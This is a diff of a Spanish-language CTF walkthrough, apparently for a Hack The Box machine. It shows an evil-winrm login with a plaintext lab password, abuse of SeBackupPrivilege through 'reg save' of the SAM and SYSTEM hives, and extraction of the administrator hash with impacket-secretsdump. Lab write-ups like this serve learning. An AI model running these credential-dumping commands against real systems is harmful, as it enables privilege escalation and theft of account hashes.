@@ -356,18 +356,18 @@ nxc winrm 10.129.231.149 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
 Vemos que si que pertenece al grupo así que nos conectamos usando [[EVIL_WINRM]] con las opciones
 - `-i` para pasarle la IP
 - `-u` para añadir el usuario
-`evil-winrm  -i 10.129.231.149 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'`
+- `-p` para pasar la contraseña
+```shell
+evil-winrm  -i 10.129.231.149 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
+```
 
-Para ver a que grupo pertenecemos ejecutaremos
-`net user emily.oscars`, viendo que pertenecemos al grupo `Backup Operators`
+Una vez dentro vemos a que grupo pertenecemos usando `net user emily.oscars`, viendo que pertenecemos al grupo `Backup Operators`
 
-Para ver los privilegios que tiene nuestro usuario usaremos 
-`whoami /priv`
-
+Veremos los privilegios que tiene nuestro usuario usaremos ejecutaremos `whoami /priv`
 Una vez nos hemos conectados habrá que escalar privilegios
 
 
-## Escalada de privilegios
+# Escalada de privilegios
 
 Vemos que tenemos privilegios que no deben de estar como por ejemplo `SeBackupPrivilege`
 
@@ -375,12 +375,31 @@ Buscamos en el navegador como abusar de el, encontramos un repositorio de github
 
 En el que se explica paso por paso la escalada de privilegios
 
-Primero deberemos crear un directorio `/temp` con `mkdir C:\temp`
+- Primero deberemos crear un directorio `/temp` 
+	```shell
+	mkdir C:\temp
+	```
 
-Segundo se copia la `sam` al directorio `/temp` que hemos creado yde `system` guardándolo en nuestro `/temp` con `reg save hklm\sam C:\temp\sam.hive`
-y con `reg save hklm\system C:\temp\system.hive`
+- Segundo se copia la `sam` al directorio `/temp` que hemos creado y copiamos también el de  `system` guardándolo en nuestro `/temp`
+```shell
+reg save hklm\sam C:\temp\sam.hive
+```
 
-Tercero pasamos el archivo `sam` y `system`  a nuestra maquina atacante con `download sam.hive` y con  `download system.hive`para poder coger los hashes de los usuarios actuales con `impacket-secretsdump -sam sam.hive -system system.hive LOCAL`
+```shell
+reg save hklm\system C:\temp\system.hive
+```
+
+- Tercero pasamos el archivo `sam` y `system`  a nuestra maquina atacante con 
+```shell
+download sam.hive
+```
+
+ ```shell
+ download system.hive
+ ```
+
+ 
+  `impacket-secretsdump -sam sam.hive -system system.hive LOCAL`
 
 Obtenmiendo asi el hash del usuario administrador 
 ```ad-hint
